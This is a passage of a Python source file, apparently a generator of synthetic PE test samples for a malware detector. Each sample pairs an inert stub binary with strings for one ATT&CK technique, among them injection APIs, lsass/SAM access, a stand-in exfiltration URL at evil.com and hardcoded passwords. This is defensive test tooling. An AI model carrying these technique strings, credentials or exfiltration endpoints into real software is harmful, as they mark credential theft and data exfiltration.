    out_path.write_bytes(bytes(data) + _T1564_003_OVERLAY)
    return out_path


# T1202 Indirect Command Execution
_T1202_OVERLAY = (
    b"pcalua.exe\x00"
    b"conhost.exe\x00"
    b"-a\x00"
    b"ShellExecuteExW\x00"
    b"open\x00"
)


def build_t1202_indirect_command(out_path: Path) -> Path:
    """T1202: Запуск кода через pcalua.exe/conhost.exe для обхода ограничений."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1202_OVERLAY)
    return out_path


# T1553.004 Install Root Certificate
_T1553_004_OVERLAY = (
    b"CertAddCertificateContextToStore\x00"
    b"Crypt32.dll\x00"
    b"ROOT\x00"
    b"CERT_SYSTEM_STORE_LOCAL_MACHINE\x00"
)


def build_t1553_004_install_root_cert(out_path: Path) -> Path:
    """T1553.004: Установка самоподписанного корневого сертификата в хранилище доверенных."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1553_004_OVERLAY)
    return out_path


# T1056.002 GUI Input Capture (Phishing UI)
_T1056_002_OVERLAY = (
    b"CreateWindowExA\x00"
    b"password\x00"
    b"Edit\x00"
    b"Log in\x00"
    b"GetWindowTextW\x00"
    b"WM_GETTEXT\x00"
)


def build_t1056_002_phishing_ui(out_path: Path) -> Path:
    """T1056.002: Фальшивое окно авторизации для перехвата пароля (Phishing UI)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1056_002_OVERLAY)
    return out_path


# --- v0.1.6 Lateral Movement & Network Discovery ---

# T1018 Remote System Discovery
_T1018_OVERLAY = (
    b"NetServerEnum\x00"
    b"GetIpNetTable\x00"
    b"netapi32.dll\x00"
    b"iphlpapi.dll\x00"
    b"SV_TYPE_ALL\x00"
)


def build_t1018_remote_system_discovery(out_path: Path) -> Path:
    """T1018: Поиск удалённых систем (NetServerEnum, GetIpNetTable/ARP)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1018_OVERLAY)
    return out_path


# T1087.001 Account Discovery: Local Account
_T1087_001_OVERLAY = (
    b"NetUserEnum\x00"
    b"netapi32.dll\x00"
    b"/etc/passwd\x00"
    b"getpwent\x00"
)


def build_t1087_001_local_account_discovery(out_path: Path) -> Path:
    """T1087.001: Перечисление локальных учётных записей (NetUserEnum, /etc/passwd)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1087_001_OVERLAY)
    return out_path


# T1087.002 Account Discovery: Domain Account
_T1087_002_OVERLAY = (
    b"ADSI\x00"
    b"NetGetDisplayInformationIndex\x00"
    b"LDAP\x00"
    b"DirectorySearcher\x00"
    b"activeds.dll\x00"
)


def build_t1087_002_domain_account_discovery(out_path: Path) -> Path:
    """T1087.002: Запросы к Active Directory (ADSI, NetGetDisplayInformationIndex)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1087_002_OVERLAY)
    return out_path


# T1046 Network Service Discovery
_T1046_OVERLAY = (
    b"connect\x00"
    b"80\x00"
    b"443\x00"
    b"445\x00"
    b"3389\x00"
    b"ws2_32.dll\x00"
    b"10.\x00"
    b"192.168.\x00"
)


def build_t1046_network_service_discovery(out_path: Path) -> Path:
    """T1046: Сканирование портов (80, 443, 445, 3389) во внутренней подсети."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1046_OVERLAY)
    return out_path


# T1069.001 Permission Groups Discovery: Local Groups
_T1069_001_OVERLAY = (
    b"NetLocalGroupEnum\x00"
    b"netapi32.dll\x00"
    b"Administrators\x00"
)


def build_t1069_001_local_groups_discovery(out_path: Path) -> Path:
    """T1069.001: Перечисление локальных групп (NetLocalGroupEnum)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1069_001_OVERLAY)
    return out_path


# T1021.001 Remote Services: RDP
_T1021_001_OVERLAY = (
    b"mstscax.dll\x00"
    b"3389\x00"
    b"rdp\x00"
    b"Terminal Services\x00"
    b"WTSConnect\x00"
)


def build_t1021_001_rdp(out_path: Path) -> Path:
    """T1021.001: RDP-клиент, порт 3389."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1021_001_OVERLAY)
    return out_path


# T1021.002 Remote Services: SMB/Admin Shares
_T1021_002_OVERLAY = (
    b"NetUseAdd\x00"
    b"\\\\*\\C$\x00"
    b"\\\\*\\ADMIN$\x00"
    b"Named Pipe\x00"
    b"npfs\x00"
    b"netapi32.dll\x00"
)


def build_t1021_002_smb_admin_shares(out_path: Path) -> Path:
    """T1021.002: Доступ к админ-шарам (NetUseAdd, C$, ADMIN$, Named Pipes)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1021_002_OVERLAY)
    return out_path


# T1072 Software Deployment Tools
_T1072_OVERLAY = (
    b"SCCM\x00"
    b"PDQ Deploy\x00"
    b"CCMSetup\x00"
    b"Software\\Microsoft\\CCM\x00"
    b"CcmExec\x00"
)


def build_t1072_software_deployment_tools(out_path: Path) -> Path:
    """T1072: Признаки SCCM, PDQ Deploy в реестре/путях."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1072_OVERLAY)
    return out_path


# T1570 Lateral Tool Transfer (строки для триггера YARA meta.technique=T1570)
_T1570_OVERLAY = (
    b"CopyFileEx\x00"
    b"\\\\host\\C$\x00"
    b"\\\\host\\ADMIN$\x00"
    b"NetUseAdd\x00"
    b"WriteFile\x00"
    b"kernel32.dll\x00"
)


def build_t1570_lateral_tool_transfer(out_path: Path) -> Path:
    """T1570: Копирование исполняемого на удалённые сетевые ресурсы."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1570_OVERLAY)
    return out_path


# T1011.001 Exfiltration Over Bluetooth
_T1011_001_OVERLAY = (
    b"BluetoothFindFirstDevice\x00"
    b"Bthprops.cpl\x00"
    b"bthprops.dll\x00"
    b"WSALookupServiceNext\x00"
)


def build_t1011_001_bluetooth_exfil(out_path: Path) -> Path:
    """T1011.001: Передача данных по Bluetooth (BluetoothFindFirstDevice, Bthprops)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1011_001_OVERLAY)
    return out_path


# --- Final 11 techniques (v1.0 matrix 75) ---

# T1195.002 Supply Chain: Compromise Software Dependencies (malicious export in system DLL)
_T1195_002_OVERLAY = (
    b"zlib.dll\x00"
    b"libssl.dll\x00"
    b"MaliciousExport\x00"
    b"DllMain\x00"
    b"decompress_hook\x00"
)


def build_t1195_002_supply_chain_dll(out_path: Path) -> Path:
    """T1195.002: Имитация внедрения в системную DLL (zlib/libssl + вредоносный экспорт)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1195_002_OVERLAY)
    return out_path


# T1553.002 Subvert Trust: Code Signing (fake/expired signature)
_T1553_002_OVERLAY = (
    b"expired certificate\x00"
    b"Authenticode\x00"
    b"code signing\x00"
    b"signtool.exe\x00"
)


def build_t1553_002_code_signing(out_path: Path) -> Path:
    """T1553.002: Поддельная/просроченная подпись (signing_trust, штрафы)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1553_002_OVERLAY)
    return out_path


# T1078 Valid Accounts (hardcoded credentials)
_T1078_OVERLAY = (
    b"admin:Password123!\x00"
    b"DOMAIN\\svc_backup\x00"
    b"p@ssw0rd\x00"
    b"NetUseAdd\x00"
    b"WNetAddConnection2\x00"
)


def build_t1078_valid_accounts(out_path: Path) -> Path:
    """T1078: Захардкоженные учётные данные (логин/пароль к сервисам)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1078_OVERLAY)
    return out_path


# T1137 Office Application Startup (Add-ins)
_T1137_OVERLAY = (
    b"Addins\x00"
    b"WLL\x00"
    b"XLSTART\x00"
    b"STARTUP\\Word\x00"
    b"Application.AddIns\x00"
)


def build_t1137_office_startup(out_path: Path) -> Path:
    """T1137: Надстройки Office (Add-ins, XLSTART, автозапуск Word/Excel)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1137_OVERLAY)
    return out_path


# T1546.002 Event Triggered Execution: Screensaver
_T1546_002_OVERLAY = (
    b"Control Panel\\Desktop\x00"
    b"SCRNSAVE.EXE\x00"
    b"RegSetValueEx\x00"
    b"ScreenSaveActive\x00"
)


def build_t1546_002_screensaver(out_path: Path) -> Path:
    """T1546.002: Установка скринсейвера через реестр (SCRNSAVE.EXE)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1546_002_OVERLAY)
    return out_path


# T1048.003 Exfiltration Over Uncommonly Used Port
_T1048_003_OVERLAY = (
    b"1337\x00"
    b"666\x00"
    b"4444\x00"
    b"connect\x00"
    b"ws2_32.dll\x00"
    b"WSAConnect\x00"
)


def build_t1048_003_uncommon_port(out_path: Path) -> Path:
    """T1048.003: Соединение на нестандартные порты (1337, 666, 4444)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1048_003_OVERLAY)
    return out_path


# T1562.006 Impair Defenses: Indicator Blocking (hosts file)
_T1562_006_OVERLAY = (
    b"C:\\Windows\\System32\\drivers\\etc\\hosts\x00"
    b"definition.microsoft.com\x00"
    b"update.microsoft.com\x00"
    b"WriteFile\x00"
    b"0.0.0.0\x00"
)


def build_t1562_006_hosts_blocking(out_path: Path) -> Path:
    """T1562.006: Модификация hosts для блокировки обновлений AV."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1562_006_OVERLAY)
    return out_path


# T1102 Web Service (Pastebin, GitHub Gist, Google Docs as C2)
_T1102_OVERLAY = (
    b"pastebin.com\x00"
    b"gist.githubusercontent.com\x00"
    b"docs.google.com\x00"
    b"raw.githubusercontent.com\x00"
    b"C2 config\x00"
)


def build_t1102_web_service(out_path: Path) -> Path:
    """T1102: Легитимные веб-сервисы как C2 (Pastebin, Gist, Google Docs)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1102_OVERLAY)
    return out_path


# T1014 Rootkit (driver .sys, SSDT)
_T1014_OVERLAY = (
    b"KeServiceDescriptorTable\x00"
    b"SSDT\x00"
    b"NtQuerySystemInformation\x00"
    b".sys\x00"
    b"ZwSetSystemInformation\x00"
    b"PsLookupProcessByProcessId\x00"
)


def build_t1014_rootkit(out_path: Path) -> Path:
    """T1014: Признаки руткита (драйвер .sys, SSDT, скрытие)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1014_OVERLAY)
    return out_path


# T1204.002 User Execution: Malicious File (dangerous types in archive)
_T1204_002_OVERLAY = (
    b"payload.vbs\x00"
    b".zip\x00"
    b"WScript.Shell\x00"
    b"ExpandArchive\x00"
    b".vbs\x00"
)


def build_t1204_002_malicious_file(out_path: Path) -> Path:
    """T1204.002: Опасные типы файлов внутри архивов (.vbs в .zip)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1204_002_OVERLAY)
    return out_path


# T1491 Defacement (wallpaper/desktop)
_T1491_OVERLAY = (
    b"SystemParametersInfo\x00"
    b"SPI_SETDESKWALLPAPER\x00"
    b"Desktop\\wallpaper\x00"
    b"0x0014\x00"
)


def build_t1491_defacement(out_path: Path) -> Path:
    """T1491: Изменение обоев/визуальных ресурсов (вымогатели)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1491_OVERLAY)
    return out_path


# --- Top-20 sub-techniques ---

# T1546.003 WMI Event Subscription
_T1546_003_OVERLAY = (
    b"__EventFilter\x00"
    b"CommandLineEventConsumer\x00"
    b"__EventConsumer\x00"
    b"IWbemServices\x00"
    b"PutInstance\x00"
)


def build_t1546_003_wmi_subscription(out_path: Path) -> Path:
    """T1546.003: WMI Event Subscription (__EventFilter, CommandLineEventConsumer)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1546_003_OVERLAY)
    return out_path


# T1547.009 Shortcut Modification
_T1547_009_OVERLAY = (
    b"Start Menu\x00"
    b".lnk\x00"
    b"IShellLinkW\x00"
    b"SetPath\x00"
    b"GetPath\x00"
    b"IPersistFile\x00"
)


def build_t1547_009_shortcut_modification(out_path: Path) -> Path:
    """T1547.009: Модификация ярлыков (.lnk в Start Menu, подмена Target)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1547_009_OVERLAY)
    return out_path


# T1546.007 Netsh Helper DLL
_T1546_007_OVERLAY = (
    b"netsh\x00"
    b"add helper\x00"
    b"INetCfg\x00"
    b"netsh.exe\x00"
)


def build_t1546_007_netsh_helper(out_path: Path) -> Path:
    """T1546.007: Регистрация вредоносной DLL через netsh add helper."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1546_007_OVERLAY)
    return out_path


# T1055.002 DLL Injection (CreateRemoteThread + LoadLibrary)
_T1055_002_OVERLAY = (
    b"CreateRemoteThread\x00"
    b"LoadLibraryA\x00"
    b"LoadLibraryW\x00"
    b"VirtualAllocEx\x00"
    b"WriteProcessMemory\x00"
)


def build_t1055_002_dll_injection(out_path: Path) -> Path:
    """T1055.002: DLL Injection (CreateRemoteThread + LoadLibrary)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1055_002_OVERLAY)
    return out_path


# T1055.003 Thread Execution Hijacking
_T1055_003_OVERLAY = (
    b"SuspendThread\x00"
    b"SetThreadContext\x00"
    b"GetThreadContext\x00"
    b"ResumeThread\x00"
    b"NtSetContextThread\x00"
)


def build_t1055_003_thread_hijacking(out_path: Path) -> Path:
    """T1055.003: Thread Execution Hijacking (SuspendThread + SetThreadContext)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _T1055_003_OVERLAY)
    return out_path


# ---------------------------------------------------------------------------
# Artifact Factory v1.1: language / packer builders
# ---------------------------------------------------------------------------

_RUST_STRINGS = (
    b"rustc\x00"
    b"panic\x00"
    b"core::panic\x00"
    b"std::rt::lang_start\x00"
    b"__rust_alloc\x00"
)


def _pe_with_extra_section(
    section_name: bytes,
    section_content: bytes,
    base_content: Optional[bytes] = None,
) -> bytes:
    """Собирает PE с двумя секциями: .text (из base или минимальный ret) и вторая секция."""
    base = base_content if base_content is not None else _minimal_pe_base()
    # Базовый PE однопользовательский — подменяем на два раздела
    # Пересобираем: DOS+PE+COFF+Opt + 2 section headers + .text + section_content
    dos = base[0:64]
    pe_sig = base[64:68]
    coff = base[68:88]
    # Меняем NumberOfSections на 2
    coff_new = bytearray(coff)
    coff_new[2:4] = struct.pack("<H", 2)
    opt = bytearray(base[88:312])
    opt[48:52] = struct.pack("<I", 0x4000)
    opt[52:56] = struct.pack("<I", 0x400)
    sec1_name = b".text\x00\x00\x00"
    sec1 = struct.pack(
        "<IIIIIIHHII", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0, 0x60000020,
    )
    align = (len(section_content) + 0x1FF) & ~0x1FF
    sec2_pad = section_content + b"\x00" * (align - len(section_content))
    sec2_name = section_name.ljust(8, b"\x00")[:8]
    sec2 = struct.pack(
        "<IIIIIIHHII",
        len(sec2_pad), 0x2000, len(sec2_pad), 0x400, 0, 0, 0, 0, 0, 0x40000040,
    )
    headers = dos + pe_sig + bytes(coff_new) + opt + sec1_name + sec1 + sec2_name + sec2
    pad = 0x200 - len(headers)
    if pad < 0:
        pad = 0
    text_body = base[312:312 + 0x200] if len(base) >= 512 else (b"\xC3" + b"\x00" * 0x1FF)
    return headers + b"\x00" * pad + text_body + sec2_pad


def build_rust_sample(out_path: Path) -> Path:
    """Добавляет секцию .rustc и характерные строки Rust для детекции языка."""
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe = _pe_with_extra_section(b".rustc\x00\x00", _RUST_STRINGS)
    out_path.write_bytes(pe)
    return out_path


def build_pyinstaller_sample(out_path: Path) -> Path:
    """Имитирует структуру упакованного PyInstaller с магическими байтами MEI\\014."""
    mei_magic = b"MEI\x0c"
    pyi_strings = (
        b"PyInstaller\x00"
        b"pyi-archive\x00"
        b"PYZ\x00"
        + mei_magic
    )
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + pyi_strings)
    return out_path


def build_go_sample_obfuscated(out_path: Path) -> Path:
    """Имитирует Go-бинарник с обфусцированными именами (таблица символов / строки)."""
    # Типичные префиксы Go + обфусцированные имена (подмена символов)
    go_runtime = (
        b"runtime.main\x00"
        b"go.buildid\x00"
        b"type..eq\x00"
    )
    obfuscated = (
        b"main.aBc\x00"
        b"main.xYz\x00"
        b"github.com/xxx/yyy.init\x00"
    )
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + go_runtime + obfuscated)
    return out_path


# --- v1.2 Extreme Language & Packer: Nim, AutoIt, Delphi, Zig, Electron, .NET ---

_NIM_STRINGS = (
    b"nimrtl\x00"
    b"NimMain\x00"
    b"nimFrame\x00"
    b"raiseException\x00"
    b"nimZeroMem\x00"
    b"system.nim\x00"
)


def build_nim_sample(out_path: Path) -> Path:
    """Nim: детекция по строкам рантайма и обработке исключений (популярен у APT)."""
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe = _pe_with_extra_section(b".nim\x00\x00\x00", _NIM_STRINGS)
    out_path.write_bytes(pe)
    return out_path


_AUTOIT_STRINGS = (
    b"AutoIt\x00"
    b"AutoIt3\x00"
    b"AU3!\x00"
    b"AutoItScript\x00"
)


def build_autoit_sample(out_path: Path) -> Path:
    """AutoIt/AutoHotkey: маскировка под скриптовую автоматизацию (вложенные ресурсы/байт-код)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _AUTOIT_STRINGS)
    return out_path


_DELPHI_STRINGS = (
    b"TApplication\x00"
    b"TForm\x00"
    b"Borland\x00"
    b"Delphi\x00"
    b"VCL\x00"
    b".tls\x00"
)


def build_delphi_sample(out_path: Path) -> Path:
    """Delphi/FreePascal: VCL-формы и RTTI (огромный пласт старого вредоносного ПО)."""
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe = _pe_with_extra_section(b".data\x00\x00\x00", _DELPHI_STRINGS)
    out_path.write_bytes(pe)
    return out_path


_ZIG_STRINGS = (
    b"zig\x00"
    b"root\x00"
    b"std.builtin\x00"
    b"LLVM\x00"
    b"__zig_alloc\x00"
)


def build_zig_sample(out_path: Path) -> Path:
    """Zig: современный язык, LLVM-артефакты и специфические секции."""
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe = _pe_with_extra_section(b".zig\x00\x00\x00", _ZIG_STRINGS)
    out_path.write_bytes(pe)
    return out_path


_ELECTRON_ASAR_HEADER = b'{"files":{'
_ELECTRON_STRINGS = (
    b"app.asar\x00"
    b"electron\x00"
    b"node.dll\x00"
    b"chrome.dll\x00"
)


def build_electron_sample(out_path: Path) -> Path:
    """Electron (Node.js): минимальный ASAR-подобный заголовок для поиска вредоносного JS."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay = _ELECTRON_ASAR_HEADER + b'"package.json":{}' + _ELECTRON_STRINGS
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay)
    return out_path


_DOTNET_MZ = b"MZ"
# Минимальный .NET PE: DOS stub + PE + .text + .idata + .reloc + .rsrc; CLI header в .text или отдельная секция
_DOTNET_STRINGS = (
    b"mscoree.dll\x00"
    b"_CorExeMain\x00"
    b".NET\x00"
    b"v4.0.30319\x00"
)


def build_dotnet_sample(out_path: Path) -> Path:
    """.NET (C#/F#): метаданные Assembly, GUID, Strong Name; детекция ConfuserEx по строкам."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _DOTNET_STRINGS)
    return out_path


# --- APT-style: autoit_wrapper, themida_stub, pyinstaller_bundle, dotnet_obfuscated ---

def build_autoit_wrapper(out_path: Path, script_overlay: Optional[bytes] = None) -> Path:
    """AutoIt wrapper: PE с оверлеем, имитирующим скрытый скрипт в ресурсах (APT)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay = script_overlay or (b"AU3!\x00\x00\x00\x00" + b"#AutoIt3Script\x00" + b"Run('cmd.exe')\x00")
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _AUTOIT_STRINGS + overlay)
    return out_path


def simulate_themida_stub(out_path: Path) -> Path:
    """Имитация Themida: набор секций (.themida/.winlice) и высокая энтропия контента."""
    import os
    random_high_entropy = os.urandom(1024)
    sec_name = b".themida\x00"
    pe = _pe_with_extra_section(sec_name, random_high_entropy)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(pe)
    return out_path


def build_pyinstaller_bundle(out_path: Path) -> Path:
    """Структура PyInstaller с PYZ-оверлеем: pyi-archive, имена упакованных файлов для extractor."""
    mei = b"MEI\x0c"
    # Минимальный CArchive-подобный заголовок: magic + длины + имена (для pyinstaller_extractor)
    pyi_header = (
        b"PyInstaller\x00"
        b"pyi-archive\x00"
        b"PYZ\x00"
        + mei
        + b"\x00\x00\x00\x00"
        + b"main\x00"
        + b"python38.dll\x00"
        + b"base_library.zip\x00"
    )
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + pyi_header)
    return out_path


_CONFUSEREX_STRINGS = (
    b"ConfuserEx\x00"
    b"Confuser\x00"
    b"cex\x00"
    b".confuser\x00"
    b"dnlib\x00"
)


def build_dotnet_obfuscated(out_path: Path) -> Path:
    """Имитация ConfuserEx через метаданные/строки в оверлее (APT .NET обфускация)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _DOTNET_STRINGS + _CONFUSEREX_STRINGS)
    return out_path


# --- v2.0 Exotic & Invisible: Ruby/Lua embedded, Swift, JAR-in-EXE ---

_RUBY_EMBEDDED_STRINGS = (
    b"ruby\x00"
    b"RUBY\x00"
    b"mri_embed\x00"
    b"rb_enc\x00"
    b"RString\x00"
)
_LUA_EMBEDDED_STRINGS = (
    b"lua_\x00"
    b"LUA\x00"
    b"luaL_\x00"
    b"lua_state\x00"
    b"luaopen_\x00"
)


def build_ruby_embedded_sample(out_path: Path) -> Path:
    """Ruby (Embedded): имитация артефакта с встроенным интерпретатором и зашифрованным скриптом в оверлее."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _RUBY_EMBEDDED_STRINGS)
    return out_path


def build_lua_embedded_sample(out_path: Path) -> Path:
    """Lua (Embedded): встроенный интерпретатор, типичные строки рантайма."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _LUA_EMBEDDED_STRINGS)
    return out_path


_SWIFT_STRINGS = (
    b"swiftCore\x00"
    b"$s\x00"
    b"Swift\x00"
    b"swift_retain\x00"
    b"swift_release\x00"
)


def build_swift_sample(out_path: Path) -> Path:
    """Swift (Win/Lin): манглированные имена ($s...) и swiftCore рантайм."""
    out_path.parent.mkdir(parents=True, exist_ok=True)
    pe = _pe_with_extra_section(b".swift\x00\x00", _SWIFT_STRINGS)
    out_path.write_bytes(pe)
    return out_path


# --- v3.1 QA Suite: слоёные угрозы (Attack Chains, Recursive Packer, Stego) ---

_CHAINED_ATTACK_OVERLAY = (
    b"GetComputerNameA\x00"
    b"GetVersionExA\x00"
    b"GetVersionExW\x00"
    b"OpenProcess\x00"
    b"lsass.exe\x00"
    b"SAM\x00"
    b"exfil\x00"
    b"C2\x00"
    b"https://exfil.evil.com/upload\x00"
)


def build_chained_attack_sample(out_path: Path) -> Path:
    """
    Цепочка атак: Discovery (T1082) -> Credential Access (T1003) -> Exfiltration (T1020).
    Оверлей со строками GetComputerName/GetVersion (T1082), lsass/SAM (T1003), exfil/C2 (T1020).
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _CHAINED_ATTACK_OVERLAY)
    return out_path


def build_recursive_packer_sample(out_path: Path) -> Path:
    """
    Два слоя: упаковка MPRESS (секция .MPRESS1) + XOR-шифрование секции данных.
    PE с секциями .text, .MPRESS1, .rdata (XOR-нагрузка); статически виден MPRESS и высокоэнтропийный .rdata.
    """
    payload = _T1055_INJECTION_PAYLOAD
    xor_key = 0x41
    encoded = obfuscate_payload(payload, method="xor", key=xor_key)
